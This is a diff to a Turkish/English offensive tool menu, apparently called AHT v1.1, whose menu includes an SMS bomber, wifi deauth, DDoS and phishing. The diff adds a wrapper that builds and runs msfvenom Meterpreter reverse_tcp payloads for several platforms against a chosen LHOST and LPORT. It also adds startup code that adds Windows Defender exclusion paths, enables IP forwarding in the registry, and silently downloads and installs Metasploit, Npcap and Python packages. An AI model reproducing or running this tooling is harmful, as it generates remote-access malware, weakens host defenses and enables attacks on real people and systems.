@@ -1,4 +1,259 @@
-import platform, os, subprocess, time, socket, threading, json, urllib.request, urllib.parse, random, sys, warnings, logging, atexit, requests
+import platform, os, subprocess, time, socket, threading, json, urllib.request, urllib.parse, random, sys, warnings, logging, atexit
+
+def _check_deps():
+    gerekli = {"requests":"requests","colorama":"colorama","bs4":"beautifulsoup4","scapy":"scapy","duckduckgo_search":"duckduckgo_search"}
+    eksik = []
+    for mod, pip_ad in gerekli.items():
+        try:
+            __import__(mod)
+        except ImportError:
+            eksik.append(pip_ad)
+    if eksik:
+        print("Eksik paketler kuruluyor:", ", ".join(eksik))
+        subprocess.run([sys.executable, "-m", "pip", "install"] + eksik)
+        print("Kurulum tamam. Yeniden baslatiliyor...")
+        subprocess.run([sys.executable] + sys.argv)
+        sys.exit(0)
+
+_check_deps()
+
+def _download_with_progress(url, path, label=""):
+    import urllib.request
+    son = [0]
+    def _cb(ak, blk, top):
+        if top > 0:
+            pct = min(int(ak * blk / top * 100), 100)
+            if pct != son[0]:
+                son[0] = pct
+                sys.stdout.write(f"\r  {label}... %{pct}")
+                sys.stdout.flush()
+        else:
+            sys.stdout.write(f"\r  {label}... {ak*blk//1024}KB")
+            sys.stdout.flush()
+    try:
+        urllib.request.urlretrieve(url, path, _cb)
+        sys.stdout.write(f"\r  {label}... %100 OK      \n")
+        sys.stdout.flush()
+        return True
+    except:
+        sys.stdout.write(f"\r  {label}... HATA        \n")
+        sys.stdout.flush()
+        return False
+
+def _msi_kontrol(path):
+    with open(path, "rb") as f:
+        bas = f.read(4)
+    if bas == b"\xd0\xcf\x11\xe0": return "msi"
+    if bas[:2] == b"PK": return "zip"
+    return "bilinmiyor"
+
+def _msi_yukle(tmp, hedef, label=""):
+    import zipfile, shutil, glob as globmod
+    tip = _msi_kontrol(tmp)
+    if tip == "msi":
+        # msiexec /a ile icerigi hedefe cikar (WiX INSTALLLOCATION bugini bypass)
+        ok(f"{label} dosyasi ayiklaniyor...")
+        ps_cmd = f"Start-Process msiexec -ArgumentList '/a \"{tmp}\" TARGETDIR=\"{hedef}\" /qb' -Verb RunAs -Wait"
+        subprocess.run(["powershell", "-Command", ps_cmd])
+        # Dosyalari bul (SourceDir\metasploit-framework\... altinda olabilir)
+        for kok, _, fs in os.walk(hedef):
+            if "msfvenom.bat" in fs:
+                return True
+        # Bazen SourceDir icinde cikar
+        src = os.path.join(hedef, "SourceDir")
+        if os.path.isdir(src):
+            for kok, _, fs in os.walk(src):
+                if "msfvenom.bat" in fs:
+                    # Hedefe tasi
+                    for item in os.listdir(kok):
+                        syk = os.path.join(kok, item)
+                        hdf = os.path.join(hedef, item)
+                        if os.path.isdir(syk):
+                            if os.path.exists(hdf):
+                                shutil.rmtree(hdf)
+                            shutil.copytree(syk, hdf)
+                        else:
+                            shutil.copy2(syk, hdf)
+                    return True
+        return False
+    elif tip == "zip":
+        warn(f"{label} zip olarak algilandi. Ayiklaniyor...")
+        try:
+            cikti = os.path.join(os.path.dirname(hedef), "metasploit-zip")
+            with zipfile.ZipFile(tmp, "r") as z:
+                z.extractall(cikti)
+            for kok, _, fs in os.walk(cikti):
+                if "msfvenom.bat" in fs:
+                    if os.path.exists(hedef):
+                        shutil.rmtree(hedef)
+                    shutil.copytree(cikti, hedef)
+                    return True
+        except:
+            pass
+    return False
+
+def _msfvenom_bul():
+    for surucu in "CDEFGH":
+        for yol in [
+            f"{surucu}:\\metasploit-framework\\bin\\msfvenom.bat",
+            f"{surucu}:\\metasploit\\msfvenom.bat",
+            f"{surucu}:\\metasploit\\bin\\msfvenom.bat",
+            f"{surucu}:\\metasploit-framework\\embedded\\framework\\msfvenom",
+            f"{surucu}:\\metasploit\\metasploit-framework\\bin\\msfvenom.bat",
+            f"{surucu}:\\Program Files\\Metasploit\\bin\\msfvenom.bat",
+            f"{surucu}:\\Program Files (x86)\\Metasploit\\bin\\msfvenom.bat",
+            f"{surucu}:\\Tools\\Metasploit\\bin\\msfvenom.bat",
+        ]:
+            if os.path.exists(yol):
+                return yol
+    if os.name == "nt":
+        try:
+            import winreg
+            for koku in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
+                for anahtar in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
+                    try:
+                        with winreg.OpenKey(koku, anahtar) as key:
+                            i = 0
+                            while True:
+                                try:
+                                    alt = winreg.EnumKey(key, i)
+                                    with winreg.OpenKey(key, alt) as alt_key:
+                                        try:
+                                            ad = winreg.QueryValueEx(alt_key, "DisplayName")[0]
+                                            if "metasploit" in ad.lower():
+                                                yol = winreg.QueryValueEx(alt_key, "InstallLocation")[0]
+                                                if yol:
+                                                    for alt_dosya in ["bin\\msfvenom.bat", "bin\\msfvenom", "msfvenom.bat", "embedded\\framework\\msfvenom"]:
+                                                        mf = os.path.join(yol, alt_dosya)
+                                                        if os.path.exists(mf):
+                                                            return mf
+                                        except:
+                                            pass
+                                except OSError:
+                                    break
+                                i += 1
+                    except:
+                        pass
+        except ImportError:
+            pass
+    return None
+
+def _msi_kaydi_temizle():
+    """Bozuk/kayip MSI kaydini bulup kaldirir. Varsa True dondurur."""
+    if os.name != "nt": return False
+    try:
+        import winreg
+        for koku in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
+            for anahtar in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
+                try:
+                    with winreg.OpenKey(koku, anahtar) as key:
+                        i = 0
+                        while True:
+                            try:
+                                alt = winreg.EnumKey(key, i)
+                                with winreg.OpenKey(key, alt) as alt_key:
+                                    try:
+                                        ad = winreg.QueryValueEx(alt_key, "DisplayName")[0]
+                                        if "metasploit" in ad.lower():
+                                            pid = alt
+                                            warn(f"Bozuk Metasploit kaydi bulundu: {pid}")
+                                            warn("Kaldiiriliyor...")
+                                            ps_cmd = f"Start-Process msiexec -ArgumentList '/x {pid} /qb' -Verb RunAs -Wait"
+                                            subprocess.run(["powershell", "-Command", ps_cmd])
+                                            return True
+                                    except:
+                                        pass
+                            except OSError:
+                                break
+                            i += 1
+                except:
+                    pass
+    except ImportError:
+        pass
+    return False
+
+def _path_ekle(yeni_klasor):
+    """Klasoru kullanici PATH'ine ekle (setx ile)"""
+    if os.name != "nt": return
+    try:
+        subprocess.run(["powershell", "-Command",
+            f'$p=[Environment]::GetEnvironmentVariable("Path","User");'
+            f'if($p -split ";" -notcontains "{yeni_klasor}"){{'
+            f'[Environment]::SetEnvironmentVariable("Path","$p;{yeni_klasor}","User")}}'],
+            capture_output=True, timeout=10)
+        subprocess.run(["setx", "PATH", f"{yeni_klasor};%PATH%"], capture_output=True, timeout=10)
+    except:
+        pass
+
+def _check_system_deps():
+    import shutil, tempfile
+    if os.name == "nt":
+        istisnalar = [os.getcwd()]
+        msf = shutil.which("msfvenom")
+        if msf:
+            msf_dir = os.path.dirname(msf)
+            msf_root = os.path.dirname(msf_dir)
+            for p in [msf_dir, msf_root]:
+                if p and os.path.isdir(p):
+                    istisnalar.append(p)
+        for yol in istisnalar:
+            try:
+                subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{yol}' -ErrorAction SilentlyContinue"],
+                             capture_output=True, timeout=10)
+            except:
+                pass
+        # IP forwarding
+        try:
+            subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
+                          "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
+                         capture_output=True, timeout=10)
+        except:
+            pass
+    # Npcap otomatik
+    if os.name == "nt":
+        npcap_drv = os.path.expandvars(r"%SystemRoot%\System32\drivers\npcap.sys")
+        if not os.path.exists(npcap_drv):
+            print("Npcap kuruluyor...")
+            url = "https://npcap.com/dist/npcap-1.79.exe"
+            tmp = os.path.join(tempfile.gettempdir(), "npcap.exe")
+            if _download_with_progress(url, tmp, "Npcap indiriliyor"):
+                subprocess.run([tmp, "/S"], shell=True)
+                os.remove(tmp)
+                print("Npcap kuruldu.")
+    # Metasploit kontrol (sorarak)
+    if not _msfvenom_bul():
+        _msi_kaydi_temizle()
+        if input("Metasploit kurulsun mu? (E/h): ").strip().lower() in ("", "e", "evet", "y", "yes"):
+            hedef = "C:\\metasploit-framework"
+            url = "https://windows.metasploit.com/metasploitframework-latest.msi"
+            tmp = os.path.join(tempfile.gettempdir(), "metasploit.msi")
+            if _download_with_progress(url, tmp, "Metasploit indiriliyor (~250MB)"):
+                boyut = os.path.getsize(tmp)
+                if boyut < 5000000:
+                    print("Indirilen dosya gecersiz. Manuel indir:", url)
+                    os.remove(tmp)
+                else:
+                    print("Metasploit kuruluyor...")
+                    if _msi_yukle(tmp, hedef, "Metasploit"):
+                        os.remove(tmp)
+                        _path_ekle(os.path.join(hedef, "bin"))
+                        if os.name == "nt":
+                            try:
+                                subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{hedef}' -ErrorAction SilentlyContinue"],
+                                             capture_output=True, timeout=10)
+                            except:
+                                pass
+                        print(f"Metasploit kuruldu: {hedef}")
+                        if input("Bilgisayar yeniden baslatilsin mi? (E/h): ").strip().lower() in ("", "e", "evet", "y", "yes"):
+                            subprocess.run(["shutdown", "/r", "/t", "5", "/c", "AHT - Metasploit kurulumu tamamlandi"])
+                            sys.exit(0)
+                    else:
+                        print("Kurulum basarisiz. Manuel indir:", url)
+    print()
+
+import requests
 
 logging.getLogger("scapy").setLevel(logging.ERROR)
 warnings.filterwarnings("ignore", message="No libpcap")
@@ -152,6 +407,13 @@ DIL = {
         "telefon_no_gir": "Telefon numarası (05XX, Enter=iptal)",
         "kac_sonuc": "Kaç sonuç istiyorsun?",
         "kaydet_sor": "Sonuçlar kaydedilsin mi?",
+        "msf_baslik": "MSFVenom Payload Üretici",
+        "msf_yok": "msfvenom bulunamadı! Metasploit kurulu değil.",
+        "msf_link": "https://windows.metasploit.com/metasploitframework-latest.msi adresinden indirin.",
+        "platform_sec": "Hedef Platform",
+        "payload_sec": "Payload türü",
+        "cikti_formati": "Çıktı formatı",
+        "uretilen_komut": "Oluşturulan komut",
         "tumu": "Tümü",
         "site_klonla": "Site Klonla (Gerçek Sayfa Kopyala)",
         "hedef_url": "Hedef URL (https://...)",
@@ -284,6 +546,13 @@ DIL = {
         "telefon_no_gir": "Phone number (05XX, Enter=cancel)",
         "kac_sonuc": "How many results?",
         "kaydet_sor": "Save results?",
+        "msf_baslik": "MSFVenom Payload Generator",
+        "msf_yok": "msfvenom not found! Metasploit is not installed.",
+        "msf_link": "Download from https://windows.metasploit.com",
+        "platform_sec": "Target Platform",
+        "payload_sec": "Payload type",
+        "cikti_formati": "Output format",
+        "uretilen_komut": "Generated command",
         "tumu": "All",
         "site_klonla": "Clone Site (Real Page Copy)",
         "hedef_url": "Target URL (https://...)",
@@ -697,13 +966,30 @@ def ag_tara(interface, ip_araligi):
             return
         gorulen.add(ip); cihazlar.append({"ip": ip, "mac": mac, "isim": isim_bul(ip)})
 
+    durum = [True]
+    def spinner():
+        for c in "|/-\\":
+            if not durum[0]: break
+            sys.stdout.write(f"\r  {G}{_('ag_taramasi')}... {c}{S}")
+            sys.stdout.flush()
+            time.sleep(0.15)
+
+    import threading
+    t = threading.Thread(target=spinner, daemon=True)
+    t.start()
     try:
         from scapy.all import ARP, Ether, srp
         ag = ip_network(ip_araligi, strict=False)
         r = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(ag)), iface=interface, timeout=5, verbose=0)[0]
+        durum[0] = False; t.join(0.5)
         for g, a in r: ekle(a.psrc, a.hwsrc)
+        sys.stdout.write(f"\r  {G}{_('ag_taramasi')}... OK{' '*3}{S}\n")
+        sys.stdout.flush()
         return cihazlar
     except:
+        durum[0] = False; t.join(0.5)
+        sys.stdout.write(f"\r  {R}{_('hata')}{' '*10}{S}\n")
+        sys.stdout.flush()
         pass
     try:
         sonuc = subprocess.run(["arp", "-a"] if System == "Windows" else ["arp", "-a", "-n"], capture_output=True, text=True)
@@ -1663,6 +1949,78 @@ def google_dorking():
         fail(_("hata"))
     input(f"  {Y}{_('enter')}{S} ")
 
+def msfvenom_wrapper():
+    baslik(_("msf_baslik"))
+    import tempfile
+    print("  Metasploit araniyor...", flush=True)
+    msfvenom_yolu = _msfvenom_bul()
+    if not msfvenom_yolu:
+        fail(_("msf_yok"))
+        _msi_kaydi_temizle()
+        if soru("  Metasploit indirilip kurulsun mu? (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
+            surucu = "C"
+            hedef = f"{surucu}:\\metasploit-framework"
+            url = "https://windows.metasploit.com/metasploitframework-latest.msi"
+            tmp = os.path.join(tempfile.gettempdir(), "metasploit.msi")
+            if _download_with_progress(url, tmp, "Metasploit indiriliyor (~250MB)"):
+                boyut = os.path.getsize(tmp)
+                if boyut < 5000000:
+                    fail("Indirilen dosya gecersiz (cok kucuk). Manuel indir:")
+                    warn(url)
+                    os.remove(tmp)
+                else:
+                    ok("Kurulum baslatiliyor...")
+                    if _msi_yukle(tmp, hedef, "Metasploit"):
+                        os.remove(tmp)
+                        _path_ekle(os.path.join(hedef, "bin"))
+                        if os.name == "nt":
+                            try:
+                                subprocess.run(["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{hedef}' -ErrorAction SilentlyContinue"],
+                                             capture_output=True, timeout=10)
+                            except:
+                                pass
+                        ok(f"Metasploit kuruldu: {hedef}")
+                        if soru("  Bilgisayar yeniden baslatilsin mi?", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
+                            subprocess.run(["shutdown", "/r", "/t", "5", "/c", "AHT - Metasploit kurulumu tamamlandi"])
+                            sys.exit(0)
+                    else:
+                        fail("Kurulum basarisiz.")
+        input(f"  {Y}{_('enter')}{S} "); return
+    platforms = [
+        ("1", "Windows", "windows/meterpreter/reverse_tcp"),
+        ("2", "Android", "android/meterpreter/reverse_tcp"),
+        ("3", "Linux", "linux/x86/meterpreter/reverse_tcp"),
+        ("4", "Mac", "osx/x64/meterpreter/reverse_tcp"),
+        ("5", "PHP", "php/meterpreter/reverse_tcp"),
+        ("6", "Python", "python/meterpreter/reverse_tcp"),
+    ]
+    ok(_("platform_sec"))
+    for num, ad, __ in platforms:
+        print(f"  {W}{num}.{S} {ad}")
+    plt = input(f"  {_('secim')}: ").strip()
+    pmap = {n: (a, p) for n, a, p in platforms}
+    if plt not in pmap: return
+    platform_adi, payload = pmap[plt]
+    lhost = input(f"  LHOST (IP): ").strip()
+    if not lhost: return
+    lport = input(f"  LPORT (port): ").strip()
+    if not lport or not lport.isdigit(): return
+    formats = [("1", "exe"), ("2", "py"), ("3", "php"), ("4", "war"), ("5", "elf"), ("6", "apk"), ("7", "raw")]
+    ok(_("cikti_formati"))
+    for num, ad in formats:
+        print(f"  {W}{num}.{S} {ad}")
+    fmt = input(f"  {_('secim')}: ").strip()
+    fm = {n: f for n, f in formats}
+    ext = fm.get(fmt, "exe")
+    dosya_adi = f"payload_{platform_adi.lower()}.{ext}"
+    cmd = f"{msfvenom_yolu} -p {payload} LHOST={lhost} LPORT={lport} -f {ext} -o {dosya_adi}"
+    print(f"\n  {G}{_('uretilen_komut')}:{S}")
+    print(f"  {C}{cmd}{S}\n")
+    if soru("  Çalıştırılsın mı? (E/h)", "E").strip().lower() in ("", "e", "evet", "y", "yes"):
+        subprocess.run(cmd, shell=True)
+        ok(f"{dosya_adi} oluşturuldu.")
+    input(f"\n  {Y}{_('enter')}{S} ")
+
 def osint_menu():
     global LANG
     while True:
@@ -2019,49 +2377,61 @@ def phishing_menu():
 
 # --| Bagimlilik Kontrolu |-- #
 def bagimlilik_kontrol():
-    eksik = []
-    for modul, pip_ad in [("scapy","scapy"), ("colorama","colorama"), ("requests","requests"),
-                          ("bs4","beautifulsoup4")]:
+    if os.name == "nt":
+        # IP forwarding
         try:
-            __import__(modul)
+            subprocess.run(["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
+                          "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
+                         capture_output=True, timeout=10)
+        except:
+            pass
+    # Python paketleri (otomatik, sormadan)
+    gerekli = {"requests":"requests","colorama":"colorama","bs4":"beautifulsoup4","scapy":"scapy","duckduckgo_search":"duckduckgo_search"}
+    eksik = []
+    for mod, pip_ad in gerekli.items():
+        try:
+            __import__(mod)
         except ImportError:
             eksik.append(pip_ad)
     if eksik:
-        print(f"{Y}  Eksik paketler:{S} {', '.join(eksik)}")
-        r = input(f"  {Y}Otomatik kurulsun mu?{S} (E/h): ").strip().lower()
-        if r in ("", "e", "evet", "y", "yes"):
-            for p in eksik:
-                info(f"{p} kuruluyor...")
-                subprocess.run([sys.executable, "-m", "pip", "install", p], capture_output=True)
-            ok("Paketler kuruldu.")
-    if OS == "Windows":
+        print("Eksik paketler kuruluyor:", ", ".join(eksik))
+        subprocess.run([sys.executable, "-m", "pip", "install"] + eksik)
+        print("Kurulum tamam. Yeniden baslatiliyor...")
+        subprocess.run([sys.executable] + sys.argv)
+        sys.exit(0)
+    if os.name == "nt":
+        # Npcap otomatik kurulum
         import ctypes
+        npcap_var = False
         try:
             import winreg
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall") as k:
-                for i in range(winreg.QueryInfoKey(k)[0]):
+            for koku in [winreg.HKEY_LOCAL_MACHINE]:
+                for anahtar in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                     try:
-                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
-                        v = winreg.QueryValueEx(n, "DisplayName")[0]
-                        if "Npcap" in v:
-                            return
-                    except:
-                        pass
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall") as k:
-                for i in range(winreg.QueryInfoKey(k)[0]):
-                    try:
-                        n = winreg.OpenKey(k, winreg.EnumKey(k, i))
-                        v = winreg.QueryValueEx(n, "DisplayName")[0]
-                        if "Npcap" in v:
-                            return
+                        with winreg.OpenKey(koku, anahtar) as k:
+                            for i in range(winreg.QueryInfoKey(k)[0]):
+                                try:
+                                    n = winreg.OpenKey(k, winreg.EnumKey(k, i))
+                                    v = winreg.QueryValueEx(n, "DisplayName")[0]
+                                    if "Npcap" in v:
+                                        npcap_var = True
+                                except:
+                                    pass
                     except:
                         pass
         except:
             pass
-        warn("Npcap bulunamadi! Bazi ag islemleri calismayabilir.")
-        info("install.bat dosyasini YONETICI olarak calistirin:")
-        info("  install.bat'i Yonetici olarak calistirin:")
-        info("  Sag tik -> Yonetici olarak calistir\n")
+        if not npcap_var:
+            print("Npcap kuruluyor...")
+            import tempfile
+            url = "https://npcap.com/dist/npcap-1.79.exe"
+            tmp = os.path.join(tempfile.gettempdir(), "npcap.exe")
+            if _download_with_progress(url, tmp, "Npcap indiriliyor"):
+                subprocess.run([tmp, "/S"], shell=True)
+                os.remove(tmp)
+                print("Npcap kuruldu.")
+    print()
 
 bagimlilik_kontrol()
 
@@ -2071,7 +2441,7 @@ while True:
     if Location == "Home":
         if kucuk_ekran():
             print(f"""  {W}+------------------------------------+{S}
-  {W}|       AHT v1.0b - Alperen Buba     |{S}
+  {W}|       AHT v1.1 - Alperen Buba      |{S}
   {W}+------------------------------------+{S}
 """)
         else:
@@ -2082,14 +2452,14 @@ while True:
     ██╔══██║██╔══██║   ██║   
     ██║  ██║██║  ██║   ██║   
     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   """ + S + f"""
-    {W}  version 1.0b - Alperen Buba{S}
+    {W}  version 1.1 - Alperen Buba{S}
 """)
         durum_cubugu()
         secim = secim_menu([
             ("1",_("sms_bomber")), ("2",_("wifi_deauth")), ("3",_("network_tools")),
             ("4",_("ip_geo")), ("5",_("port_scanner")), ("6",_("mac_changer")),
             ("7",_("ddos")), ("8",_("osint")), ("9",_("phishing")),
-            ("L",_("dil_degistir")), ("0",_("cikis")),
+            ("10",_("msf_baslik")), ("L",_("dil_degistir")), ("0",_("cikis")),
         ])
         if secim.upper() == "L":
             LANG = "EN" if LANG == "TR" else "TR"
@@ -2104,6 +2474,7 @@ while True:
             case "7": Location = "ddos_tool"
             case "8": Location = "osint_menu"
             case "9": Location = "phishing"
+            case "10": msfvenom_wrapper()
             case "0": clear_screen(); sys.exit(0)
             case _: input(f"  {R}{_('gecersiz')}{S} {Y}{_('enter')}{S} ")
 
